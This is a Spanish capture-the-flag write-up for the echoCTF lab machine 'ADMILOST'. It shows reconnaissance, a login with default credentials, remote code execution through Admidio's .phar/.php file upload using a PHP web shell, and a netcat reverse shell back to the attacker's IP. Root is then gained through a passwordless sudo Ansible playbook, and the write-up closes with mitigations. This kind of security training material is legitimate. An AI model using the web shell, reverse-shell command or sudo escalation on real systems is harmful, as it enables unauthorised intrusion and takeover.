![admin1](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin.png)
# Introduccion 

La máquina **ADMILOST** presenta un escenario de escalación de privilegios basado en una aplicación web llamada **ADMIDIO**, que está expuesta en el puerto HTTP y vulnerable a Remote Code Execution (RCE) mediante la carga de archivos `.phar`. Posteriormente, la escalación a root se logra gracias a un binario sudo configurado para ser ejecutado sin 
contraseña por el usuario limitado `www-data`.

___
# Reconocimiento y Escaneo

Comenzamos el reconocimiento de la máquina **Admilost** con un escaneo de puertos utilizando **rustscan**. El comando utilizado fue el siguiente:

```python  
❯ rustscan -a 10.0.160.243
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/sheepsstealer/snap/rustscan/436/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.0.160.243:22
Open 10.0.160.243:80
[~] Starting Script(s)
[!] Error Exit code = 127
```

Luego hacemos un escaneo con `nmap` para verificar los servicios que corren en esos puertos 

``` bash
nmap -sSC -vv --min-rate -p 22,80 10.0.160.243 

PORT    STATE  SERVICE  REASON
22/tcp  closed ssh      reset ttl 64
80/tcp  closed http     reset ttl 64
```
Observamos que el puerto 80 corre un servicio HTTP por lo cual podemos conectarnos mediante un URL en un navegador web

____

# Acceso inicial a la aplicacion web

Al intentar acceder a `http://10.0.160.243` en navegador, se detecta un problema DNS:

``` python
This site can’t be reached admilost.echocity-f.com’s DNS address could not be found.
```

### Solución DNS local

Editamos el archivo `/etc/hosts` para mapear la IP con el nombre DNS esperado:

```bash
sudo nano /etc/hosts
#Una vez dentro del archivo agregamos lo siguiente
10.0.160.243    admilost.echocity-f.com
```

Ahora que el dns se encuentra en nuestros hosts locales prodemos proceder a recargar la pagina la cual nos muestra la siguiente pagina 

![admin1](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/ADMIN1.png)

Notamos que tiene diferentes acciones pero todas estan limitadas asi que probamos ingresar al login para ver si podemos acceder como administrador y obtener funciones adicionales

### Credentials Default

* user: admin
* password: admin123

Tras iniciar sesión, verificamos la versión exacta de ADMIDIO utilizada, lo cual es crucial para identificar posibles vulnerabilidades públicas.

![admin](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin4.png)

___
# Identificacion de vulnerabilidades

Se realiza una búsqueda en **Exploit Database** utilizando `searchsploit`:

``` bash
searchsploit admidio

❯ searchsploit admidio
----------------------------------------------------------------------
Exploit Title                                                                 | Path
----------------------------------------------------------------------
Admidio 1.4.8 - 'getfile.php' Remote File Disclosure                          | php/webapps/5575.txt
Admidio 2.3.5 - Multiple Vulnerabilities                                      | php/webapps/21005.txt
Admidio 3.2.8 - Cross-Site Request Forgery                                    | php/webapps/42005.txt
Admidio 3.3.5 - Cross-Site Request Forgery (Change Permissions)               | php/webapps/45322.txt
Admidio v4.2.10 - Remote Code Execution (RCE) <------------ This is the one   | php/webapps/51590.txt
Admidio v4.2.5 - CSV Injection                                                | php/webapps/51402.txt
----------------------------------------------------------------------


```

Los resultados muestran múltiples vulnerabilidades para varias versiones, destacando:

- **Admidio v4.2.10 – Remote Code Execution (RCE)**  
    Permite ejecución remota de código mediante la carga de archivos `.phar` en la sección de anuncios.

___
# Explotacion de RCE mediante carga de archivos

Del exploit anterior obtenemos el siguiente [Exploid and PoC](https://www.exploit-db.com/exploits/51590)

```txt
Exploit Title: Admidio v4.2.10 - Remote Code Execution (RCE)
Application: Admidio
Version: 4.2.10
Bugs:  RCE
Technology: PHP
Vendor URL: https://www.admidio.org/
Software Link: https://www.admidio.org/download.php
Date of found: 10.07.2023
Author: Mirabbas Ağalarov
Tested on: Linux
```
```python

2. Technical Details & POC
========================================
Steps:

3. Login to account
4. Go to Announcements
5. Add Entry
6. Upload .phar file in image upload section.
.phar file Content
<?php echo system('cat /etc/passwd');?>
5. Visit .phar file  ( http://localhost/admidio/adm_my_files/announcements/images/20230710-172217_430o3e5ma5dnuvhp.phar )
```
``` bash
www-data@admilost:~/html/adm_my_files/announcements/images$ sudo -l
Matching Defaults entries for www-data on admilost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on admilost:
    (ALL : ALL) NOPASSWD: /usr/local/bin/templater
```

SIguiendo el ejemplo anterior se sube un archivo .php con la siguiente shell dentro

``` php
<?php system($_GET['cmd']); ?>
```

![admin](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin5.png)

![admin](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin6.png)

Aqui despues de subir la imagen la mandamos al servidor para que nos proporcione su URL con su ID del archivo

![admin](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin7.png)

En este punto es importante copiar el endpoint que hace referencia a nuestro archivo y ponerlo en la siguiente url

![admin](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/ADMINLOST/admin8.png)

```c
http://admilost.echocity-f.com/adm_my_files/announcements/images/20250531-061003_9rqlec91aaryzd6y.php
```

___
# Intrusion

Configuramos un listener en nuestra maquina atacante para recibir una conexion inversa

```bash
nc -lvnp 4444
```

En la URL accedemos con un parámetro que lanza una Reverse Shell hacia nuestro equipo:

```
http://admilost.echocity-f.com/adm_my_files/announcements/images/20250531-061003_9rqlec91aaryzd6y.php?cmd=nc 10.10.6.42 4444 -e /bin/bash
```

Esto generara una conexion con nuestra shell remota en escucha

Para mejorar la interacción, se realiza un ajuste de la terminal remota:

```bash
script /dev/null -c bash
# Ctrl+Z para suspender
stty raw -echo; fg
reset
export TERM=xterm
export SHELL=bash
```

___
# Enumeracion de privilegios y escalacion

Ejecutamos `sudo -l ` para ver si hay binarios que pueden ejecutarse con sudo sin password

```bash
Matching Defaults entries for www-data on admilost:

env_reset, mail_badpass,

secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on admilost:

(ALL : ALL) NOPASSWD: /usr/local/bin/templater
```

Dentro de este archivo hay un binario que puede ser explotado, procedemos a hacerle un cat para ver su interior

```bash
#!/usr/bin/env ansible-playbook

---

- name: Parse templates

hosts: all

gather_facts: false

serial: 1

connection: local

tasks:

- name: Generate template data

template:

src: /etc/template.j2

dest: /tmp/template.out

www-
```

podemos buscar en [CTFOBINS](https://gtfobins.github.io/gtfobins/ansible-playbook/) la manera de ocupar este binario para la escalacion de privilegios 

Al poder ejecutar Ansible Playbooks con permisos root y sin restricciones, podemos crear un playbook malicioso que ejecute un shell root:

``` bash
TF=$(mktemp)
cat << EOF > $TF
- hosts: localhost
  gather_facts: no
  tasks:
    - name: Ejecutar shell root
      shell: /bin/sh
      stdin_open: yes
      tty: yes
EOF
```
Una vez creado el archivo ejecutamos el binario

```bash
sudo /usr/local/bin/templater $TF
```

Resultado:
```bash
PLAY [localhost] ***************************************************************

TASK [Gathering Facts] *********************************************************
ok: [localhost]

TASK [Ejecutar shell root] *****************************************************
# whoami
root
#

```

___
# Obtencion de banderas

Con privilegios root, se realiza una búsqueda en todo el sistema para encontrar archivos que contengan las banderas del CTF:

```bash
bash -p
cd /
grep -rlE "ETSCTF_[0-9a-f]+" --exclude-dir=proc --exclude-dir=dev 2>/dev/null | \
xargs strings | cat - <(strings /proc/*/environ 2> /dev/null) | \
cat - <(find / -name "ETSCTF_*" 2> /dev/null) | \
grep -oE "ETSCTF_[0-9a-f]+" | sort | uniq

```

resultado

```bash
ETSCTF_SheepsStealer_was_here:D
ETSCTF_SheepsStealer_was_here:D
ETSCTF_SheepsStealer_was_here:D
ETSCTF_SheepsStealer_was_here:D

```

___
# Identificacion de vulnerabilidades

|Vulnerabilidad|Descripción|Impacto|
|---|---|---|
|Carga insegura de archivos (`.phar`)|Falta de validación y sanitización de archivos en la sección de anuncios, permite RCE.|Permite ejecución remota bajo usuario `www-data`.|
|Ejecución sin restricciones de Ansible Playbooks con sudo|El binario `/usr/local/bin/templater` puede ser ejecutado con privilegios root sin contraseña.|Escalada directa a root sin requerir contraseña.|
|Credenciales por defecto expuestas|Uso de credenciales predeterminadas para acceso inicial.|Facilita acceso inicial sin necesidad de explotación.|

# Mitigacion de riesgos

- Implementar validación y sanitización estricta en la carga de archivos, restringiendo tipos peligrosos como `.phar` y `.php`.
    
- Restringir el uso de sudo para usuarios no privilegiados, especialmente evitando ejecución sin contraseña de binarios con permisos root.
    
- Auditar y asegurar playbooks y scripts que se ejecutan con privilegios elevados para evitar ejecución arbitraria.
    
- Cambiar credenciales por defecto y aplicar políticas de contraseñas robustas.
    
- Implementar monitoreo y alertas para accesos sospechosos o ejecución de comandos inusuales en servidores críticos.

~~~~ Writeup by sheeps stealer ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~